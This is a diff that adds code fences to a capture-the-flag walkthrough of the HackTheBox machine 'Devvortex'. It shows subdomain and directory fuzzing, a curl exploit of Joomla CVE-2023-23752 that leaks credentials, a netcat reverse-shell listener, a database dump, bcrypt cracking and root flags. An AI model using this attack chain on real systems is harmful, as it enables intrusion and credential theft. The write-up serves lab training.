@@ -5,6 +5,7 @@ http://devvortex.htb/ this domain was founded while running the script.
 Add this into the "/etc/hosts"
 -------------------------------------------------------------
 2. Enumerate for the subdomain and trying directory brute forcing 
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -fs 154  
 
@@ -32,8 +33,10 @@ ________________________________________________
 
 dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 304ms]
 :: Progress: [4989/4989] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
+```
 -------------------------------------------------------------------------------------------------------------
 3.There directory bruteforcing, there find some directories.
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ dirsearch -u http://dev.devvortex.htb/                                          
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -190,9 +193,11 @@ Target: http://dev.devvortex.htb/
 [19:13:52] 403 -    4KB - /tmp/xd.php
 [19:13:52] 403 -    4KB - /tmp/uploads.php
 [19:13:53] 403 -  564B  - /twitter/.env                                     
-[19:14:07] 200 -    3KB - /web.config.txt  
+[19:14:07] 200 -    3KB - /web.config.txt
+```
 =======================================================================================================================
 4. The webpage identified the version 4.2.6 and the exploits "Exploit for CVE-2023-23752 (4.0.0 <= Joomla <= 4.2.7)."
+```bash
 ──(sabeshan㉿kali)-[~]
 └─$ curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
 * Host dev.devvortex.htb:80 was resolved.
@@ -246,10 +251,12 @@ Target: http://dev.devvortex.htb/
 {"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},
 {"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},
 {"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],
-"meta":{"total-pages":4}} 
+"meta":{"total-pages":4}}
+```
 ------------------------------------------------------------------------------------------------------------------------
 there is credentials called lewis:P4ntherg0t1n5r3c0n##
 with that credentials there is dashboard there and activate the remote shell with that.
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ nc -lvnp 1337         
 listening on [any] 1337 ...
@@ -370,8 +377,10 @@ mysql> select * from sd4fg_users;
 +-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
 2 rows in set (0.00 sec)
 
-mysql> 
+mysql>
+```
 --------------------------------------------------------------------------------------------
+```bash
 ┌──(sabeshan㉿kali)-[~/HTB/devvortex]
 └─$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 Using default input encoding: UTF-8
@@ -382,9 +391,11 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 tequieromucho    (?)     
 1g 0:00:00:17 DONE (2025-08-29 20:09) 0.05571g/s 78.21p/s 78.21c/s 78.21C/s kelvin..harry
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
+Session completed.
+```
 Identified the password for the logan paul.
 -----------------------------------------------------------------------------------------------
+```bash
 logan@devvortex:~$ sudo -l
 [sudo] password for logan: 
 Matching Defaults entries for logan on devvortex:
@@ -467,3 +478,4 @@ d4739199ea5580f38ccc11827e6e592c
 root@devvortex:/home/logan# cat user.txt
 cb2bc474aae045d108fb5bac0f5d8dc3
 root@devvortex:/home/logan# 
+```
